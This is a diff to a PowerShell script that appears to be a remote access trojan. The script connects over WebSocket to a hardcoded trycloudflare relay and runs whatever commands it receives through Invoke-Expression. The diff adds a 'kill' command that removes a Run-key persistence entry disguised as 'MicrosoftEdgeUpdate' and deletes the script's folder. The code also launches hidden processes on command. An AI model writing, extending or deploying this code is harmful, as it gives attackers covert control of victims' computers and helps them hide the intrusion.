@@ -52,11 +52,7 @@ $infos = @{
 $json = $infos | ConvertTo-Json
 
 $ws = New-Object System.Net.WebSockets.ClientWebSocket
-
-$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
-$config = Invoke-RestMethod -Uri $configUrl
-$uri = [System.Uri]"$($config.relay_url)/ws"
-
+$uri = [System.Uri]"wss://mainly-gold-omaha-reviewer.trycloudflare.com/ws"
 $token = [System.Threading.CancellationToken]::None
 
 $task = $ws.ConnectAsync($uri, $token)
@@ -84,6 +80,13 @@ while ($ws.State -eq "Open") {
                 
                 Start-Process python -ArgumentList "$playerPath --file $($cmd.file) --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
             }
+
+            elseif ($cmd.type -eq "kill") {
+                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate"
+                Remove-Item -Path $scriptDir -Recurse -Force
+                exit
+            }
+
         } catch {
             $output = Invoke-Expression $message
             $outputString = $output | Out-String
